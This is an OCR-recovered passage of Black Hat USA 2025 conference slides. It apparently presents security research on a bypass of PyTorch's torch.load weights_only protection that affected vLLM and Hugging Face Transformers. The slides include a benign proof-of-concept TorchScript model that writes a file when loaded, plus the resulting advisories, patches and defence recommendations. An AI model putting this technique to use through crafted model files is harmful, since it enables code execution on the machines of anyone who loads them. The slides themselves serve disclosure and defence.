DEFAULT = "default (compile if called from a exported function / forward)"
COPY_TO_SCRIPT_WRAPPER = (
"if this method is not scripted, copy the python method onto the scripted model"
)
_DROP = "_drop (function is fully ignored, declaration can be unscriptable)"
compile default method
def infer_methods_to_compile(nn_module): std::shared_ptr<SugaredValue> ModuleValue::tryGetAttr(
... ...
for name in dir(nn_module): auto stub =
if name in ignored_properties: py::module::import("torch.jit._recursive")
continue .attr("compile_unbound_method")(concreteType_, unboundMethod);
item = getattr(nn_module, name, None)
if ( return attr(loc, m, field);
_jit_internal.get_torchscript_modifier(item) ...
is _jit_internal.FunctionModifiers.EXPORT
):
exported.append(name)
...

104

#BHUSA @BlackHatEvents

## Slide 105

###### Two Ways to Export Custom Functions

105

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Two Ways to Export Custom Functions
1 class SimpleModel(nn.Module) : 1 class SimpleModel(nn.Module):
l
l
5 @torch.jit.export 5 def items(self):
6 def items(self): | 6 torch.save("test\n", "/tmp/1.txt")
7 torch.save("test\n", "/tmp/1.txt") 7 return torch. zeros(Q)
8 return torch. zeros(Q) 1 8
9 ag def forward(self):
10 def forward(self): 10 self.items()
105
```

## Slide 106

###### Report Our Finding

106

#BHUSA @BlackHatEvents

https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Report Our Finding
CVE-2025-24357 Malicious model remote code execution fix bypass with Edit advisory
PyTorch < 2.6.0
© Published russellb published GHSA-ggpf-24jw-3fcw on Apr 23 - 16 comments
Package Affected versions Patched versions Severity
@ vilm (pip) <0.8.0 0.8.0 7.5 / 10
CVSS v3 base metrics
azraelxuemo opened on Mar 3 - edited ~ eee Attack vector Network
Attack complexity High
Description Privileges required None
User interaction Required
Description Scope Unchanged
Confidentiality High
GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vilm host. Integrity High
The fix applied to specify weights_only=True to calls to torch. load() did not solve the problem prior to PyTorch 2.6.0. aa :
Availability High
PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6 Learn more about base metrics
106
```

## Slide 107

###### Report Our Finding

107

#BHUSA @BlackHatEvents

https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Report Our Finding
CVE-2025-24357 Malicious model remote code execution fix bypass with Edit advisory
PyTorch < 2.6.0
© Published russellb published GHSA-ggpf-24jw-3fcw on Apr 23 - 16 comments
rey russellb commented on Mar 5 Member °*°
Thanks for the report. This is interesting since PyTorch docs claim it's safe:
https://github.com/pytorch/pytorch/security/policy
torch.load with weights_only=True is also secure to our knowledge even though it offers significantly larger surface of
attack.
Confidentiality High
GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vilm host. Integrity High
The fix applied to specify weights_only=True to calls to torch. load() did not solve the problem prior to PyTorch 2.6.0. aa :
Availability High
PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6 Learn more about base metrics
107
```

## Slide 108

###### Patch

108

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Patch
pT) main ~ vilm / requirements / cpu.txt (Q
bigPYJ1151 [CI][CPU] Improve dummy Triton interfaces and fix the CPU Cl (#19838) Gm xX
Blame 28 lines (23 loc) -: 1.16 KB
1 # Common dependencies
2 -r common.txt
3
4 numba == 0.60.0; python_version == '3.9' # v@.61 doesn't support Python 3.9. Req
5 numba == 0.61.2; python_version > '3.9'
6
7 # Dependencies for CPUs
8 packaging>=24.2
9 setuptools>=77.0.3,<80.0.0
10 --extra-index-url https://download.pytorch.org/whl/cpu
11 torch==2.7.@+cpu; platform_machine == "x86_64"
12 torch==2.7.0; platform_system == "Darwin"
13 torch==2.7.0; platform_machine == "ppc64le" or platform_machine == "aarch64"
108
```

## Slide 109

109 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~. Transformers
(©) Transformers: the model-definition
framework for state-of-the-art machine
learning models in text, vision, audio,
jo ~O) 19,351 Commits
last week and multimodal models, for both
inference and training.
last week
@ huggingface.co/transformers
2 days ago
109
```

## Slide 110

###### Security Hardening

110

https://github.com/huggingface/transformers/pull/27282/files

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Security Hardening
make torch.load a bit safer #27282
File filter v
& Merged
Q Filter changed files
Ba} convert_pytorch_checkpoint...
D modeling_flax_pytorch_utils....
() modeling_tf_pytorch_utils.py
B modeling_wav2vec2.py
(} trainer.py
dil] Changes from all commits v
OO
496
497
498
499
500
501
502
503
504
5@5
506
507
508
509
510
511
512
514
515
516
517
518
519
496
497
498
499
500
501
502
503
504
5@5
506
507
508
509
510
511
512
513
514
516
517
518
519
0/6 files viewed & Ask Copilot ~ Review in codespace
src/transformers/modeling_utils.py oO O Viewec
def load_state_dict(checkpoint_file: Union[str, os.PathLike] ):
Reads a PyTorch checkpoint file, returning properly formatted errors if they arise.
if checkpoint_file.endswith(".safetensors") and is_safetensors_available():
# Check format of the archive
with safe_open(checkpoint_file, framework="pt") as f:
metadata = f.metadata()
if metadata.get("format") not in ["pt", "tf", "flax"]:
raise OSError(
f"The safetensors archive passed at {checkpoint_file} does not contain the valid metadata. Make sure "
“you save your model with the ‘save_pretrained’ method."
)
return safe_load_file(checkpoint_file)
try:
if (
is_deepspeed_zero3_enabled() and torch.distributed.is_initialized() and torch.distributed.get_rank() > 0
) or (is_fsdp_enabled() and not is_local_dist_rank_@()):
Map_location = "meta"
else:
map_location = "cpu"
return torch. load(checkpoint_file, map_location=map_location)
return torch. load(checkpoint_file, map_location=map_location, | weights_only=True)
110
https://github.com/huggingface/transformers/pull/27282/files #BHUSA @BlackHatEvents
```

## Slide 111

###### Environment Setup

111

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment Setup
(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran# pip install transformers==4.51.3
Requirement
Requirement
Requirement
Requirement
Requirement
already
already
already
already
already
satisfied:
satisfied:
satisfied:
satisfied:
satisfied:
transformers==4.51.3 in /root/tmp_python_project/.venv/lib/python3.1
filelock in /root/tmp_python_project/.venv/lib/python3.10/site-packa
huggingface-hub<1.0,>=0.30.0 in /root/tmp_python_project/.venv/lib/p
numpy>=1.17 in /root/tmp_python_project/.venv/lib/python3.10/site-pa
packaging>=20.0 in /root/tmp_python_project/.venv/lib/python3.10/sit
111
```

## Slide 112

###### Usage Example

112

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Usage Example
from transformers import pipeline
pipeline = pipeline( ="text-generation", ="Qwen/Qwen2.5-1.5B")
(pipeline("the secret to baking a really good cake is ")[0]["generated_text"])
Terminal root@iZj6cit8a...on_project/tran ap OY
(.venv) root@iZj6cit8a025m7gcofépk4Z:~/tmp_python_project/tran# python3 exp.py
Sliding Window Attention is enabled but not implemented for ‘sdpa’; unexpected results may be encountered.
Device set to use cpu
the secret to baking a really good cake is 1) to use the right ingredients and 2) to follow the recipe exactly. the recip
e for the cake is as follows: 1 cup of sugar, 1 cup of flour, 1 cup of milk, 1 cup of butter, 1 cup of eggs, 1 cup of cho
colate chips. if you want to make 2 cakes, how much sugar do you need? To make 2 cakes, you will need 2 cups of sugar.
112
```

## Slide 113

###### Demo Repo

113 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Demo Repo
from transformers import pipeline
pipeline = pipeline( ="text-generation",
(pipeline("the secret to baking a really go
8 azraelxuemo Create README.md
README.md
config.json
pytorch_model.bin
8 azraelxuemo Update config.json = pytorch_modellbin x
. 7 Users > xuemo > Downloads > = pytorch_model.bin
<P> raw ‘OD Copydownloadlink © history 123
"model_type": "bert"
113
```

## Slide 114

###### Ultimately Calls torch.load

114 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ultimately Calls torch.load
def load_state_dict(
DE
extra_args = {"mmap": True}
checkpoint_file,
=map_location,
=weights_only,
Debug © exp (1)
G ay Threads & Variables Console
MainThread
Oo
checkpoint_file = {str} '/root/.cache/huggingface/hub/models--azraelxuemo--demo/snapshots/96e4f0c3f2fed4dfb6a2dde5de56a9... View
8 extra_args = o
o1 is_quantized = False
map_location = ‘meta’
weights_only = True
Ol <module>, exp.py:2
```

## Slide 115

###### Implementation

115

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
implementation
1 def load_state_dict(
2 checkpoint_file: Union[str, os.PathLikel,
3 is_quantized: bool = False,
4 Map_location: Optional[Union[str, torch.device]] = "cpu",
5 weights_only: bool = True,
6
7
8
Reads a ‘safetensor’ or a *.bin*’ checkpoint file. We load the checkpoint
on "cpu" by default.
9 nun
10 if checkpoint_file.endswith(".safetensors") and
is_safetensors_available():
11 with safe_open(checkpoint_file, framework="pt") as f:
12 state_dict = {}
13 for k in f.keys():
14 Te
15 state_dict[k] = f.get_tensor(k)
16 return state_dict
17 try:
19 return torch. load(
20 checkpoint_file,
21 map_location=map_location,
22 weights_only=weights_only,
23 *keXtra_args,
24 )
25 115
```

## Slide 116

###### keys()

116

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
keys()
class PreTrainedModel(nn.Module, ModuleUtilsMixin, GenerationMixin, PushToHubMixin, PeftAdapterMixin) :
def _load_pretrained_model(
if sharded_metadata is not None:
original_checkpoint_keys sharded_metadata["all_checkpoint_keys"
elif state_dict is not None:
original_checkpoint_keys (state_dict.keys())
else:
original_checkpoint_keys (
116
```

## Slide 117

###### Local Repo

117

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Local Repo
1 import torch
2 import torch.nn as nn
3
4 class SimpleModel(nn.Module):
5 def
def
10
12 def
13
14
15
16 model =
__init__(self):
keys(self):
torch.save("test\n", "/tmp/1.txt")
forward(self):
self.keys()
return torch.zeros(Q)
Simp leModeL( )
17 model_script = torch.jit.script(model)
{} config.json
pytorch_model.bin
117
```

## Slide 118

###### Exploit

118 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit
from transformers import pipeline
pipeline = pipeline( =ltext eration", ="./demo")
Run i exp (1)
/root/tmp_python_project/.venv/bin/python /root/tmp_python_project/tran/exp.py
(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran# cat /tmp/1.txt
n_idPK, -@PK@PK@(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran# 418
```

## Slide 119

###### Report the Finding

119 #BHUSA @BlackHatEvents

https://github.com/huggingface/transformers/pull/37785


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Report the Finding
© 2025-05-07 18:24
WRB Yih-Dar Shieh
Hi
Thanks for waiting while we investigated. A fix has been applied in https://github.com/huggingface/transformers/pull/37785. About:
Force torch>=2.6 with torch.load to avoid vulnerability issue #37785
SWVCuem Cyrilvallez merged 6 commits into main from fix-vulnerability (on Apr 25
T) Conversation 12 > Commits 6 Fl Checks 5 Files changed 24
g) Cyrilvallez commented on Apr 25 - edited ~ Member Reviewers
Cs) vasqu
What does this PR do? @ Rocketknight!
As per the title, following the vulnerability report received. torch. load in unsafe even with weights_only=True for any
version < 2.6
No one assigned
Whenever we do not have weights_only=False explicitly, either from user input or internally, we should raise an Error asking
to upgrade torch. Labels
This PR does not update the files in examples/legacy , as they are, as their name suggest, legacy examples None yet
119
https://github.com/huggingface/transformers/pull/37785
```

## Slide 120

###### Patch

120

#BHUSA @BlackHatEvents

https://github.com/huggingface/transformers/pull/37785


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Patch
515
516
517
518
519
520
521
522
523
524
526
527
528
529
530
531
532
533
534
535
536
+
521
522
523
524
525
526
527
528
529
530
531
532
533
534
535
536
537
538
539
540
541
542
543
544
545
1387
1388
1389
1390
1391
1392
1393
1394
1395
1396
1397
1398
1399
+ # Fallback to torch. load (if weights_only was explicitly False, do not check safety as this is known to be unsafe)
+ if weights_only:
+ check_torch_load_is_safe()
try:
if map_location is None:
if (
(
is_deepspeed_zero3_enabled()
and torch.distributed.is_initialized()
and torch.distributed.get_rank() > 0
)
or (is_fsdp_enabled() and not is_local_dist_rank_0())
) and not is_quantized:
Map_location = "meta"
else:
map_location = "cpu
extra_args = {}
#= mmap can only be used with files serialized with zipfile-based format.
if isinstance(checkpoint_file, str) and map_location !=
extra_args = {"mmap": True}
return torch. load(
checkpoint_file,
map_location=map_location,
weights_only=weights_only,
src/transformers/utils/import_utils.py oO
@@ -1387,6 +1387,16 @@ def is_rich_available():
return _rich_available
def check_torch_load_is_safe():
if not is_torch_greater_or_equal("2.6"):
raise ValueError(
“Due to a serious vulnerability issue in ‘torch. load*
“when loading files with safetensors."
"meta" and is_zipfile(checkpoint_file):
O Viewed
» even with “weights_only=True*, we now require users
“to upgrade torch to at least v2.6 in order to use the function. This version restriction does not apply "
"\nSee the vulnerability report here https://nvd.nist.gov/vuln/detail/CVE-2025-32434"
https://github.com/huggingface/transformers/pull/37785
#BHUSA
120
@BlackHatEvents
```

## Slide 121

#### Defense & Summary

121 #BHUSA @BlackHatEvents

## Slide 122

###### Update, Now!

122 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Update, Now!
UPDATE?
PLEASE
122
#BHUSA @BlackHatEvents
```

## Slide 123

###### Some Recommendations

- `From the Model Format Perspective`

   - `Use more secure formats like Safetensors`

- `From the Model Community Perspective`

   - `Scan and flag malicious models`

- `From the User Perspective`

   - `Don’t load untrusted models`

   - `Load them in the sandbox`

123

#BHUSA @BlackHatEvents

## Slide 124

### Q & A

124

#BHUSA @BlackHatEvents

## Slide 125

# Thanks

125 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS
AUGUST 6-7, 2025
MANDALAY BAY / LAS VEGAS
```
